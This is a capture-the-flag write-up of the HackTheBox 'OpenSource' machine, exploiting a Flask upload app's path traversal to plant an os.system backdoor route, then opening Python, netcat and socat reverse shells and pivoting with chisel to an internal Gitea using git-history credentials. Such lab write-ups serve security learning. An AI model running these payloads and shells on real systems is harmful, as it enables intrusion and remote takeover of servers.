# OpenSource

## Introduction

Welcome to my another writeup! In this HackTheBox [OpenSource](https://app.hackthebox.com/machines/OpenSource) machine, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Difficulty: Easy

- Overall difficulty for me: Hard
    - Initial foothold: Hard
    - Privilege escalation: Medium

# Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# export RHOSTS=10.10.11.164 
                                                                                                                        
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8=
|   256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
80/tcp open  http    syn-ack ttl 62 Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 14 Sep 2022 10:33:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 14 Sep 2022 10:33:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Nmap:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nmap -T4 -sC -sV -p- $RHOSTS
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
[...]
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
[...]
3000/tcp filtered ppp
```

According to `rustscan` and `nmap` result, we have 3 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | Werkzeug/2.1.2
3000              | Unknown?? (filtered in `nmap` scan)

## HTTP on Port 80

Let's enumerate hidden directory first via `gobuster`:

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100                    
[...]
/console              (Status: 200) [Size: 1563]
/download             (Status: 200) [Size: 2489147]
```

**`/console`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a0.png)

Hmm... We need a pin to interact with the debugger console. I tried some bypasses and they didn't work. Let's skip that at the moment.

**http://10.10.11.164/:**

```html
    <section class="jumbotron text-center">
        <div class="container">
            <h1 class="jumbotron-heading">Try upcloud</h1>
            <p class="lead text-muted">
                To explore the full extent of upcloud, please checkout the links below. <br>For setting up, download and
                unzip the package if you haven’t already.
            <p>
                <a href="/download" class="btn btn-primary my-2">Download</a>
            </p>
        </div>

        <div class="container">
            <p class="lead text-muted">
                You wanna take some time to explore the interface? We also provide immediate access to an upcloud test
                instance.
            <p>
                <a href="/upcloud" class="btn btn-secondary my-2">Take me there!</a>
            </p>
        </div>
```

In the index page, **we can download a file that contains the source code of this web server.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a1.png)

Also, **In the "Take me there!" button, it takes me to a page that upload files**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a2.png)

After uploaded, **we're shown up a download link to the recently uploaded file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a3.png)

**Let's download the source code files first!**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# curl -vv http://$RHOSTS/download       
> GET /download HTTP/1.1
[...]
< Content-Disposition: inline; filename=source.zip
```

It redirects to a file called: `source.zip`.

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# mkdir source

┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# curl http://$RHOSTS/download --output source/source.zip;cd source

┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource/source]
└─# file source.zip
source.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

**Let's `unzip` it:**
```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# unzip source.zip

┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# ls -lah 
total 2.5M
drwxr-xr-x 5 root root 4.0K Sep 14 06:42 .
drwxr-xr-x 4 root root 4.0K Sep 14 06:42 ..
drwxrwxr-x 5 root root 4.0K Apr 28 07:45 app
-rwxr-xr-x 1 root root  110 Apr 28 07:40 build-docker.sh
drwxr-xr-x 2 root root 4.0K Apr 28 07:34 config
-rw-rw-r-- 1 root root  574 Apr 28 08:50 Dockerfile
drwxrwxr-x 8 root root 4.0K Apr 28 08:50 .git
```

We can look at the `Dockerfile`:

```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# cat Dockerfile      
[...]
# Install dependencies
RUN pip install Flask

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY app .
[...]
```

It's using **Flask** to build a backend for the web server.

After unziping the `source.zip`, we can see that there is a `.git` directory.

```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# ls -lah
[...]
drwxrwxr-x 8 root root 4.0K Apr 28 08:50 .git
```

***Let's enumerate the `git`!***

**Branches:**
```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git branch 
  dev
* public
```     

**Commits (branch `public`):**
```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git log      
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git log -p -1
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

diff --git a/Dockerfile b/Dockerfile
index 76c7768..5b0553c 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

**Commits (branch `dev`):**
```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git checkout dev                       
Switched to branch 'dev'
                                                                                                                        
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git log         
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

```
┌──(root🌸siunam)-[~/…/htb/Machines/OpenSource/source]
└─# git log -p -2
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

[...]
@@ -1,5 +0,0 @@
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:{Redacated}@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```

OHH!! Found a credentials. **Not sure where should we use it, let's take a note of that.**

**Next, Let's look at the source code:**
```
┌──(root🌸siunam)-[~/…/OpenSource/source/app/app]
└─# ls -lah 
total 32K
drwxrwxr-x 4 root root 4.0K Apr 28 08:50 .
drwxrwxr-x 5 root root 4.0K Apr 28 07:45 ..
-rw-rw-r-- 1 root root  332 Apr 28 07:34 configuration.py
-rw-rw-r-- 1 root root  262 Apr 28 07:34 __init__.py
drwxrwxr-x 5 root root 4.0K Apr 28 07:39 static
drwxrwxr-x 2 root root 4.0K Apr 28 07:34 templates
-rw-rw-r-- 1 root root  816 Apr 28 07:34 utils.py
-rw-rw-r-- 1 root root  707 Apr 28 08:50 views.py
```

**utils.py:**
```py
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

**views.py:**
```py
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

**Let's break down the `views.py`:**

- If we send a GET request to `/` it will:
    - Render template `upload.html`

- If we send a POST request to `/`, it will:
    - `f` = Set `file` as the POST parameter
    - `file_name` = The uploaded filename (E.g. `revshell.py`)
    - `file_path` = Current Working Directory + "public" + "uploads" + `file_name` (E.g. `/root/ctf/htb/Machines/OpenSource/public/uploads/revshell.py`)
    - Save the uploaded file into `file_path`
    - Render a `success.html` page, with the parameter `file_url` `http://10.10.11.164/uploads/revshell.py`
    - `success.html`
```html
<div class="input-group">

        <input type="text" class="form-control"
               value="{{ file_url }}" placeholder="Some path" id="copy-input">

        <button class="btn btn-success" type="button" id="btnCopy">
            Copy
        </button>

</div>
```

- If we browse to `/uploads/<some_path_here>`:
    - `path` = The path's filename
    - We download a file from `path`

**Next, we'll break down the `utils.py`:**

- `current_milli_time()`
    - Get the current time in milliseconds, and in Unix TimeStamp format
- `get_file_name(unsafe_filename)`
    - Recursively replace filename that contains `../` into ""
- `get_unique_upload_name(unsafe_filename)`
    - Split the `unsafe_filename` into a list, `.` is the delimiter
    - `file_name` = The first index of the list
    - `file_extension` = The second index of the list
    - Recursively replace `../` into "" from `file_name`, and + `_` + current time in milliseconds + `.` + `file_extension`
- `recursive_replace(search, replace_me, with_me)`
    - If `replace_me` is not in `search`, returns `search`.

After reviewing source codes, we can see that **the upload page is vulnerable to path traversal.**

Since it only replace "`../`" into "", **it doesn't replace "`..//`" at all.**

**Proof-of-Concept:**
```
┌──(root🌸siunam)-[~/…/OpenSource/source/app/app]
└─# cd ..//     
                                                                                                                        
┌──(root🌸siunam)-[~/…/Machines/OpenSource/source/app]
└─# 
```

It successfully move up 1 directory.

**To exploit it, we can:**

- Fire up Burp Suite, and send a POST request to `/upcloud`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a5.png)

Let's fetch `/etc/passwd` for Proof-of-Concept.

- Input our path traversal payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a6.png)

- URL encode it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a7.png)

- Forward the POST request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a8.png)

- Download the `file`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a9.png)

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# cat /home/nam/Downloads/passwd                                                 
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

**We successfully exploited the path traversal vulnerability!**

But how do we gain an initial foothold on the target machine?

# Initial Foothold

Hmm... How about we let ourself in by **adding a backdoor in `/app/app/views.py`**? :D

Since we knew the absolute path of the target's Flask application **(`/app/app/`)** by viewing source codes, we can send a POST request to `/upcloud` with the path traversal payload, and append a backdoored route to `/app/app/views.py`.

**To do so, I'll:**

- Intercept a POST request in `/upcloud`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a10.png)

- Change the POST request parameter's value:

```
filename="..//app/app/views.py"
```

- Change the POST request `Content-Type`:

```
Content-Type: text/x-python
```

- Append a backdoor route into `/app/app/views.py`, and forward that POST request:

```py
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

# Backdoor route, using 'cmd' GET parameter to execute command. Just like PHP's <?php system($_GET['cmd']) ?>
@app.route('/pwned')
def backdoor():
    return os.system(request.args.get('cmd'))
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a11.png)

- Go to our newly created route:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a12.png)

**You'll see an `TypeError`, but don't afraid. We can test is it working by pinging ourself:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a13.png)

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:22:05.146078 IP 10.10.11.164 > 10.10.14.41: ICMP echo request, id 6379, seq 0, length 64
09:22:05.146155 IP 10.10.14.41 > 10.10.11.164: ICMP echo reply, id 6379, seq 0, length 64
09:22:06.146215 IP 10.10.11.164 > 10.10.14.41: ICMP echo request, id 6379, seq 1, length 64
09:22:06.146232 IP 10.10.14.41 > 10.10.11.164: ICMP echo reply, id 6379, seq 1, length 64
09:22:07.147187 IP 10.10.11.164 > 10.10.14.41: ICMP echo request, id 6379, seq 2, length 64
09:22:07.147202 IP 10.10.14.41 > 10.10.11.164: ICMP echo reply, id 6379, seq 2, length 64
09:22:08.146987 IP 10.10.11.164 > 10.10.14.41: ICMP echo request, id 6379, seq 3, length 64
09:22:08.147004 IP 10.10.14.41 > 10.10.11.164: ICMP echo reply, id 6379, seq 3, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

**We indeed received 4 ICMP echo reply!**

- Get a python reverse shell:

**Setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nc -lnvp 443
listening on [any] 443 ...
```

**Python reverse shell payload: (Generated from https://www.revshells.com/)**
```py
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.41",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
``` 

**Paste the payload in `pwned` route's `cmd` GET parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a14.png)

**Reverse shell connection:**
```
[...]
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.164] 48752
/app # whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
9e38ef79cc9b
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Notice that **the `eth0` interface is `172.17.0.3`**, which is a **docker container IP**.

I'm root in this **docker container**!

> Note: I also wrote a [python](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/exploit.py) script to automate the upload backdoor route process.

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# python3 exploit.py
[+]Writing a backdoor flask route into current working directory...
[+]Sending a POST request to modify the /app/app/views.py in the target machine...
--------------------------------------------------
[*]Hit Ctrl+C to exit this fake shell.
[*]If you want a reverse shell to the target machine, type this, setup a netcat listener and replace the YOUR_IP and PORT:
nc <YOUR_IP> <PORT> -e /bin/sh
--------------------------------------------------
┌──(root@FakeShell)-[~/HackTheBox/OpenSource]
└─# nc 10.10.14.42 443 -e /bin/sh

┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.164] 45227
python3 -c "import pty;pty.spawn('/bin/sh')"
/app # whoami;hostname;id;ip a
root
cbc47de301c4
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.4/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Anyways, **let's get a stable shell via `socat`**, this makes our live easier:

**Host the `socat` binary:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:8000/) ...
```

**Setup a `socat` TTY listener:**
```
┌──(root🌸siunam)-[~/…/OpenSource/source/app/app]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/09/14 09:49:33 socat[194675] N opening character device "/dev/pts/2" for reading and writing
2022/09/14 09:49:33 socat[194675] N listening on AF=2 0.0.0.0:4444
```

**Upload `socat` binary to the target machine, and trigger the `socat` reverse shell:**
```
/app # wget http://10.10.14.42:8000/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.10.14.42:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
```

**Stable shell connection:**
```
[...]
                                                                  2022/09/14 09:56:20 socat[196629] N accepting connection from AF=2 10.10.11.164:49584 on AF=2 10.10.14.41:4444
                                                        2022/09/14 09:56:20 socat[196629] N starting data transfer loop with FDs [5,5] and [7,7]
                        /bin/sh: can't access tty; job control turned off
/app # 
/app # stty rows 22 columns 121
/app # export TERM=xterm-256color
/app # whoami;hostname;id;ip a
root
9e38ef79cc9b
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/app # ^C
/app # 
```

# Privilege Escalation

## Docker container root to dev01

**Since We're inside a docker container, we need to escape it.**

**Let's find open ports:**
```
~ # netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      8/python
netstat: /proc/net/tcp6: No such file or directory
netstat: /proc/net/udp6: No such file or directory
```

Hmm... Only port 80??

**Do you still remember port 3000 that `nmap` scanned?**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nmap -T4 -sC -sV -p- $RHOSTS
PORT     STATE    SERVICE VERSION
[...]
3000/tcp filtered ppp
```

Also, I notice that **the stable shell session IP is `172.17.0.3`, which is interesting because docker assigns IPs sequentially.** Maybe there is **another docker container in `172.17.0.2` and `172.17.0.1`?**

```
[...]
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
```

Hmm... **Let's ping them for sanity check:**

```
~ # ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.133 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.133/0.133/0.133 ms

~ # ping -c 1 172.17.0.1
PING 172.17.0.1 (172.17.0.1): 56 data bytes
64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.080 ms

--- 172.17.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.080/0.080/0.080 ms
```

Yep, they are up.

Let's do a **local port forwarding** via `chisel` on port 3000 for `172.17.0.1`:

**Transfer `chisel` binary:**
```
┌──(root🌸siunam)-[/opt/chisel]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

~ # wget http://10.10.14.42:8000/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

**Setup a `chisel` server listener:**
```
┌──(root🌸siunam)-[/opt/chisel]
└─# ./chiselx64 server -p 8888 --reverse
```

**Connect to `chisel` server on the stable shell session, and background it:**
```
~ # /tmp/chisel client 10.10.14.42:8888 R:3001:172.17.0.1:3000 &
```

Now, we should able to interact with `172.17.0.1` on port 3000!

**Let's do a quick `nmap` scan to see what is it:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nmap -sT -T4 -sC -sV -p3001 127.0.0.1
[...]
PORT     STATE SERVICE VERSION
3001/tcp open  nessus?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=87643b347bf7586b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=GCnbkrFfWgFhpI2te5vMzVVekLY6MTY2MzQxNjUwMDAxOTM5NzA0OQ; Path=/; Expires=Sun, 18 Sep 2022 12:08:20 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 17 Sep 2022 12:08:20 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=4b2905b5159d6662; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=6u_yj_zGP1qjB3IbChggIaFIEf06MTY2MzQxNjUwMDY0NDU4MDA3Nw; Path=/; Expires=Sun, 18 Sep 2022 12:08:20 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 17 Sep 2022 12:08:20 GMT
|_    Content-Length: 0
[...]
``` 

in the HTML's title tag, it reveals this is a **Gitea**!

Let's go to `http://localhost:3001`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a15.png)

**Still remeber we have a credentials from `git log`?**

Try to login as `dev01` with that credentials!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a17.png)

